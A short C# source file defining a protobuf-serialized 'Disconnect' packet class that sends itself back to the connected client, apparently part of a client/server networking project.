using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Disconnect : IPacket
    {
        public Disconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send<Disconnect>(this);
        }
    }
}